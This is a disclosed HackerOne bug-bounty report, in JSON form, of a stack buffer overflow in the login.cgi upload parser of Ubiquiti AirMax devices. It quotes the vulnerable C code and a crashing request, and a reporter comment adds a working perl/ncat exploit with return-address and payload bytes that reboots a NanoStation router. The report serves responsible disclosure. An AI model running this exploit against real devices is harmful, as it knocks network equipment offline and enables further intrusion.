{
  "id": 74025,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83NDAyNQ==",
  "url": "https://hackerone.com/reports/74025",
  "title": "Yet another Buffer Overflow in PHP of the AirMax Products",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2015-07-05T17:04:12.735Z",
  "submitted_at": "2015-07-05T17:04:12.735Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "93c08539",
    "url": "/93c08539",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/033/613/8c3e2d95cf9be1554d0d1e8de292b45c73325047_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 800,
    "url": "https://hackerone.com/ui",
    "handle": "ui",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/fpqjzgms7de9639u414bw6vid1be/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/fpqjzgms7de9639u414bw6vid1be/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [

    ],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Ubiquiti Inc.",
      "twitter_handle": "ubiquiti",
      "website": "https://ui.com",
      "about": ""
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [

  ],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2016-04-07T22:00:33.249Z",
  "bug_reporter_agreed_on_going_public_at": "2016-03-08T22:00:21.616Z",
  "team_member_agreed_on_going_public_at": null,
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "It's me again!\r\n\r\nAfter the Report [#73491](https://hackerone.com/reports/73491) and the [#74004](https://hackerone.com/reports/74004), I bring another Buffer Overflow, this one look more like #74004, which is a overflow in stack.\r\n\r\nHas you can see bellow, is copied to the var `line` a content (POST data in this case) which can go beyond the content of the original variable. \r\n```\r\nint ub_process_content(struct upload_buffer* ub)\r\n{\r\n\tchar  line[512];\r\n\tsize_t length;\r\n\t\r\n/** some code **/\r\n\t\tif ((~ub->got) & GOT_BOUNDARY) {\r\n\t\t\teol = (char*)memmem(ptr, size, \"\\r\\n\", 2);\r\n\t\t\tif (!eol) break;\r\n\r\n\t\t\tlength = eol - ptr + 2;\r\n\t\t\tmemcpy(line, ptr, length); //!!Problem!!//\r\n\t\t\tline[length] = 0;\r\n\r\n\t/** some code **/\r\n}\r\n```\r\n\r\nAll what we need its a line with more than 512 bytes, example of request:\r\n```\r\nPOST /login.cgi HTTP/1.1\r\nHost: 127.0.0.1:8081\r\nUser-Agent: curl/7.43.0\r\nAccept: */*\r\nContent-Length: 700\r\nContent-Type: multipart/form-data; boundary=------------------------2ad2f036dd647428\r\n\r\n--------------------------2ad2f036dd647428asdfasdfasdfasdfasdfasdfsdasdfasdfasdfasdfasdfasdfdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd2ad2f036dd647428asdfasdfasdfasdfasdfasdfsdasdfasdfasdfasdfasdfasdfdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd\r\nContent-Disposition: form-data; name=\"file\"; filename=\"AAA\"\r\nContent-Type: application/octet-stream\r\n\r\nAAAA\r\n--------------------------2ad2f036dd647428--\r\n```\r\n\r\nWhen the var `ptr` point to the first line (of the POST content) it will have more the 512  bytes until \"\\r\\n\" and will overflow  the var `line`. As always it will cause a segmentation fault (probably because of overwriting of the return pointer), and the cgi will die with the return of the code 11, identical to the report #74004.\r\n\r\nSorry if I'am Bothering you with to much reports, I will wait your reply (or one week) to send another ones. ",
  "weakness": {
    "id": 2,
    "name": "Memory Corruption - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [

  ],
  "allow_singular_disclosure_at": "2016-04-07T22:00:21.953Z",
  "allow_singular_disclosure_after": -235390816.51425225,
  "singular_disclosure_allowed": true,
  "vote_count": 2,
  "voters": [
    "dyabla",
    "prowser"
  ],
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [

    ],
    "assignable_team_member_groups": [

    ]
  },
  "activities": [
    {
      "id": 502208,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "It remains vulnerable on v5.6.1.",
      "automated_response": false,
      "created_at": "2015-07-07T17:57:19.629Z",
      "updated_at": "2015-07-07T17:57:19.629Z",
      "actor": {
        "username": "93c08539",
        "cleared": false,
        "verified": false,
        "url": "/93c08539",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/033/613/8c3e2d95cf9be1554d0d1e8de292b45c73325047_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "ui"
    },
    {
      "id": 544216,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "You didn't ask, but here is the proof-of-concept exploit:\n\nIt has created for the `NanoStation Loco M2` with the last firmware (`XM.v5.6.2.27929.150716.1201`).\n```\nperl -e 'print  \"POST /login.cgi HTTP/1.1\\r\\n\",\n                \"Host: 192.168.1.20\\r\\n\",\n                \"User-Agent: curl/7.43.0\\r\\n\",\n                \"Accept: */*\\r\\n\",\n                \"Content-Length: 836\\r\\n\",\n                \"Content-Type: multipart/form-data; boundary=------------------------98f1de9547324c34\\r\\n\",\n                \"\\r\\n\",\n                \"Z\"x524, \"JJJJ\\x2A\\xBE\\xBB\\xE4HHHHGGGGFFFFEEEEDDDDCCCCBBBB\\x2A\\xC1\\xA0\\x5C\", \n                \"Z\"x24, \"KKKKJJJJ\\x2A\\xC0\\x4F\\x18zzzz\", \n                \"Z\"x24, \"\\x2A\\xC2\\x47\\xC0zzzz\", \n                \"\\x3c\\x06\\x43\\x21\\x34\\xc6\\xfe\\xdc\\x3c\\x05\\x28\\x12\\x34\\xa5\\x19\\x69\\x3c\\x04\\xfe\\xe1\\x34\\x84\\xde\\xad\\x24\\x02\\x0f\\xf8\\x01\\x01\\x01\\x0c\", \n                \"\\r\\n\",\n                \"Content-Disposition: form-data; name=\\\"file\\\"; filename=\\\"upfile\\\"\\r\\n\",\n                \"Content-Type: application/octet-stream\\r\\n\",\n                \"\\r\\n\",\n                \"AnyDataHere\\r\\n\",\n                \"\\r\\n\",\n                \"--------------------------98f1de9547324c34--\\r\\n\"' | ncat --ssl 192.168.1.20 443\n```\n\nIt will reboot the router, maybe it don't work at first try and will take some seconds to reboot. All what you will need it's `perl` and `ncat` (nmap).",
      "automated_response": false,
      "created_at": "2015-08-11T11:36:56.530Z",
      "updated_at": "2015-08-11T11:42:39.385Z",
      "actor": {
        "username": "93c08539",
        "cleared": false,
        "verified": false,
        "url": "/93c08539",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/033/613/8c3e2d95cf9be1554d0d1e8de292b45c73325047_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "ui"
    },
    {
      "id": 616222,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi, have been some time since this report has been uploaded (like #74004, #73491 and #73289), , and I seen in the Ubiquiti Community (airMAX Beta Blog), that you launch some php2 fixes. So I want to know if you can send me the source code of the AirMax (if not all, just the php2), so I can close some of this reports, with have been open 3 months already. \n\nBy the way, if you send me the code, I could prevent new bugs before their been implemented in the final version.",
      "automated_response": false,
      "created_at": "2015-10-09T23:52:43.059Z",
      "updated_at": "2015-10-09T23:52:43.059Z",
      "actor": {
        "username": "93c08539",
        "cleared": false,
        "verified": false,
        "url": "/93c08539",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/033/613/8c3e2d95cf9be1554d0d1e8de292b45c73325047_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "ui"
    },
    {
      "id": 621705,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Helo? Are you still reading these reports?",
      "automated_response": false,
      "created_at": "2015-10-15T11:07:30.136Z",
      "updated_at": "2015-10-15T11:07:30.136Z",
      "actor": {
        "username": "93c08539",
        "cleared": false,
        "verified": false,
        "url": "/93c08539",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/033/613/8c3e2d95cf9be1554d0d1e8de292b45c73325047_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "ui"
    },
    {
      "id": 622464,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi there,\n\nI will get you updates for your remaining reports early next week.  At least one of these has been addressed.\n\nThanks for testing!\n\nJames",
      "automated_response": false,
      "created_at": "2015-10-16T01:08:22.724Z",
      "updated_at": "2015-10-16T01:08:22.724Z",
      "actor": {
        "username": "ubnt-james",
        "cleared": false,
        "verified": false,
        "url": "/ubnt-james",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "ui"
    },
    {
      "id": 626258,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BountyAwarded",
      "message": "",
      "automated_response": false,
      "created_at": "2015-10-20T15:45:32.752Z",
      "updated_at": "2015-10-20T15:45:32.752Z",
      "actor": {
        "url": "/ui",
        "ibb": false,
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/fpqjzgms7de9639u414bw6vid1be/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "profile": {
          "name": "Ubiquiti Inc."
        }
      },
      "bounty_currency": "usd",
      "genius_execution_id": null,
      "team_handle": "ui",
      "collaborator": {
        "username": "93c08539",
        "url": "/93c08539"
      }
    },
    {
      "id": 626260,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugResolved",
      "message": "",
      "automated_response": false,
      "created_at": "2015-10-20T15:45:43.191Z",
      "updated_at": "2015-10-20T15:45:43.191Z",
      "actor": {
        "username": "ubnt-james",
        "cleared": false,
        "verified": false,
        "url": "/ubnt-james",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "reporter": {
        "username": "93c08539",
        "url": "/93c08539"
      },
      "genius_execution_id": null,
      "team_handle": "ui"
    },
    {
      "id": 829858,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "",
      "automated_response": false,
      "created_at": "2016-03-08T22:00:21.641Z",
      "updated_at": "2016-03-08T22:00:21.641Z",
      "first_to_agree": true,
      "actor": {
        "username": "93c08539",
        "cleared": false,
        "verified": false,
        "url": "/93c08539",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/033/613/8c3e2d95cf9be1554d0d1e8de292b45c73325047_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "ui"
    },
    {
      "id": 895016,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportBecamePublic",
      "message": "",
      "automated_response": false,
      "created_at": "2016-04-07T22:00:33.268Z",
      "updated_at": "2016-04-07T22:00:33.268Z",
      "actor": {
        "url": "/ui",
        "ibb": false,
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/fpqjzgms7de9639u414bw6vid1be/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "profile": {
          "name": "Ubiquiti Inc."
        }
      },
      "genius_execution_id": null,
      "team_handle": "ui"
    }
  ],
  "activity_page_count": 1,
  "activity_page_number": 1,
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}